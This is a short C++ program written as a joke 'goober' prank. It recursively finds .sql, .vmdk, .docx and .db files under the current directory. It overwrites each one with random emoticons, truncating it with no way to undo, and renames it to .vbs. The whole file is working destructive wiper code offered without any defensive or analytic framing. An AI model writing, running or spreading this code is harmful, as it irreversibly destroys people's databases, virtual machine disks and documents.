#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <random>

namespace fs = std::filesystem;

std::string get_goober_face() {
    static std::mt19937 gen(std::random_device{}());
    std::uniform_int_distribution<> dist(1, 100);
    if (dist(gen) == 1) return "X3"; // The legendary 1% roll
    std::vector<std::string> faces = {":3", "OwO", ">w<", "^w^"};
    return faces[std::uniform_int_distribution<>(0, 3)(gen)];
}

void goober_it(const fs::path& p) {
    std::ofstream ofs(p, std::ios::trunc); // No-undo destruction
    if (ofs) {
        for(int i=0; i<50; ++i) ofs << get_goober_face() << " ";
        ofs.close();
        fs::path vbs = p;
        vbs.replace_extension(".vbs");
        fs::rename(p, vbs);
    }
}

int main() {
    std::vector<std::string> targets = {".sql", ".vmdk", ".docx", ".db"};
    for (auto const& entry : fs::recursive_directory_iterator(fs::current_path(), fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            for (auto& ext : targets) if (entry.path().extension() == ext) goober_it(entry.path());
        }
    }
    return 0;
}
